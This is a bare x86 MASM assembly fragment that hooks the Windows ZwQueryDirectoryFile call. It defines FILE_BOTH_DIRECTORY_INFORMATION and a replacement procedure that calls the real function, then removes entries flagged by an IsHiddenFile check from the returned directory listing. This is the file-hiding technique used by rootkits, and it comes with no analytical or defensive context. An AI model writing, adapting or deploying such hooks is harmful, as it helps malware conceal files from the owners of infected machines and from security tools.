

FILE_BOTH_DIRECTORY_INFORMATION struc 
	NextEntryOffset		dd ?
	Unknown				dd ?
	CreationTime        dq ?
	LastAccessTime		dq ?
	LastWriteTime		dq ?
	ChangeTime			dq ?
	EndOfFile			dq ?
	AllocationSize		dq ? 
	FileAttributes		dd ? 
	FileNameLength		dd ? 
	EaInformationLength	dd ?
	AlternateNameLength	db ?
	_DummyAlign			db ?
	AlternateName 		dw 12 dup (?)
	FileName			dw ?
FILE_BOTH_DIRECTORY_INFORMATION ends


.code

;; -------------------------------------------------------------------------------- ;;
NewZwQueryDirectoryFile proc p1:dword, p2:dword, p3:dword, p4:dword, p5:dword, p6:dword, p7:dword, p8:dword, p9:dword, p10:dword, p11:dword
	local RealZwQueryDirectoryFile : dword

	mov RealZwQueryDirectoryFile, eax

@NextQuery:
	push p11						; RestartScan
	push p10						; FileName
	push p9							; ReturnSingleEntry
	push p8							; FileInformationClass
	push p7							; FileInformationLength
	push p6							; FileInformation
	push p5							; IoStatusBlock
	push p4							; ApcContext
	push p3							; ApcRoutine
	push p2							; Event
	push p1							; FileHandle
	call RealZwQueryDirectoryFile	; Real ZwQueryDirectoryFile
	.if eax!=STATUS_SUCCESS
		ret
	.endif

; Only FileBothDirectoryInformation
	.if p8!=3
		ret
	.endif

; Only not empty struc
	.if p6==0
		ret
	.endif

	pushad

	assume eax : ptr FILE_BOTH_DIRECTORY_INFORMATION, edx : ptr FILE_BOTH_DIRECTORY_INFORMATION
	mov eax, p6
@NextFname:

; Decision: to hide or not to hide
	lea ebx, [eax].FileName
	call IsHiddenFile
	.if ebx!=0
	
		.if eax==p6							; First record
			.if p9==TRUE
				popad
				jmp @NextQuery
			.elseif [eax].NextEntryOffset==0	; Only 1 record
				popad
				mov eax, STATUS_NO_MORE_FILES
				ret
			.endif
			mov ebx, [eax].NextEntryOffset	; 1st record len
			mov edx, eax					; 2nd -
			add edx, ebx					; record addr
			mov ecx, [edx].NextEntryOffset	; 2nd record len
			.if ecx==0
				mov ecx, sizeof FILE_BOTH_DIRECTORY_INFORMATION
				add ecx, [edx].FileNameLength
			.else
				add [edx].NextEntryOffset, ebx	; offset = len2 + len1
			.endif
			mov esi, edx		; Source
			mov edi, eax		; Destination
			rep movsb
			mov edx, eax
		.elseif [eax].NextEntryOffset==0	; Last record
			mov [edx].NextEntryOffset, 0
		.else								; Other records
			mov ecx, [eax].NextEntryOffset
			add ecx, [edx].NextEntryOffset
			mov [edx].NextEntryOffset, ecx
		.endif
	
	.else
		mov edx, eax
	.endif

; Exit if no more records
	cmp [eax].NextEntryOffset, 0
	je @End

; Check Next record
	add eax, [eax].NextEntryOffset
	jmp @NextFname

@End:
	assume eax : nothing, edx : nothing

	popad
	ret
NewZwQueryDirectoryFile endp

